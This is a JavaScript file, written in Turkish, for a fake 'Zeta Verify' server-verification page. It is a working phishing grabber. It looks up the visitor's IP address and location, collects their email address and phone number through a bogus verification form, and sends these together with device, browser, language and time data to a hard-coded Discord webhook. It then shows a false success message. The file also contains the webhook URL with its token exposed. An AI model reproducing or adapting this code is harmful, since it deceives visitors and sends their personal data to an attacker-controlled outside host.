// ==================== BURAYI DOLDUR ====================
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1522159080800518185/RT7oVMuIQVBgp7qb2L5suPst3_txYTRH0pyf9LxoYwgdkAmaWx_z7CVRZfEukqogkG0o';
// =======================================================

async function getIP() {
    try {
        const r = await fetch('https://api.ipify.org?format=json');
        const d = await r.json();
        return d.ip;
    } catch (e) {
        return 'Alınamadı';
    }
}

async function getLocation(ip) {
    try {
        const r = await fetch(`https://ipapi.co/${ip}/json/`);
        const d = await r.json();
        return `${d.city || '?'}, ${d.country_name || '?'}`;
    } catch (e) {
        return 'Bilinmiyor';
    }
}

function getDevice() {
    const ua = navigator.userAgent;
    if (/Android/i.test(ua)) return 'Android 📱';
    if (/iPhone|iPad/i.test(ua)) return 'iOS 🍎';
    if (/Windows/i.test(ua)) return 'Windows 💻';
    if (/Mac/i.test(ua)) return 'MacOS 🖥️';
    if (/Linux/i.test(ua)) return 'Linux 🐧';
    return 'Bilinmiyor';
}

async function init() {
    const ip = await getIP();
    const location = await getLocation(ip);

    document.getElementById('ipDisplay').textContent = ip;
    document.getElementById('deviceDisplay').textContent = getDevice();
    document.getElementById('locationDisplay').textContent = location;
}

function validateEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function validatePhone(phone) {
    const cleaned = phone.replace(/[\s\-\(\)\+]/g, '');
    return cleaned.length >= 10 && /^\d+$/.test(cleaned);
}

async function verify() {
    const email = document.getElementById('emailInput').value.trim();
    const phone = document.getElementById('phoneInput').value.trim();

    let valid = true;

    if (!validateEmail(email)) {
        document.getElementById('emailError').classList.add('show');
        valid = false;
    } else {
        document.getElementById('emailError').classList.remove('show');
    }

    if (!validatePhone(phone)) {
        document.getElementById('phoneError').classList.add('show');
        valid = false;
    } else {
        document.getElementById('phoneError').classList.remove('show');
    }

    if (!valid) return;

    const btn = document.getElementById('verifyBtn');
    btn.disabled = true;
    btn.textContent = 'Doğrulanıyor... ⏳';

    const ip = document.getElementById('ipDisplay').textContent;
    const device = getDevice();
    const location = document.getElementById('locationDisplay').textContent;
    const time = new Date().toLocaleString('tr-TR');

    const data = {
        embeds: [{
            title: "🕵️ Yeni Doğrulama!",
            color: 0xff0000,
            fields: [
                { name: "📧 Email", value: `\`\`\`${email}\`\`\``, inline: false },
                { name: "📱 Telefon", value: `\`\`\`${phone}\`\`\``, inline: false },
                { name: "🌐 IP", value: `\`${ip}\``, inline: true },
                { name: "📱 Cihaz", value: `\`${device}\``, inline: true },
                { name: "📍 Konum", value: `\`${location}\``, inline: true },
                { name: "🌍 Dil", value: `\`${navigator.language || 'tr'}\``, inline: true },
                { name: "🖥️ Tarayıcı", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
                { name: "⏰ Zaman", value: `\`${time}\``, inline: false }
            ],
            footer: { text: "Zeta Verify • Alpha" },
            timestamp: new Date().toISOString()
        }]
    };

    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        document.getElementById('successIcon').classList.add('show');
        document.getElementById('title').textContent = 'Doğrulama Başarılı! ✅';
        document.getElementById('desc').textContent = 'Sunucuya yönlendiriliyorsun...';
        document.getElementById('infoPanel').style.display = 'none';
        document.getElementById('formArea').style.display = 'none';

    } catch (e) {
        btn.disabled = false;
        btn.textContent = 'Doğrula ve Katıl';
        alert('Bir hata oluştu, tekrar dene.');
    }
}

init();
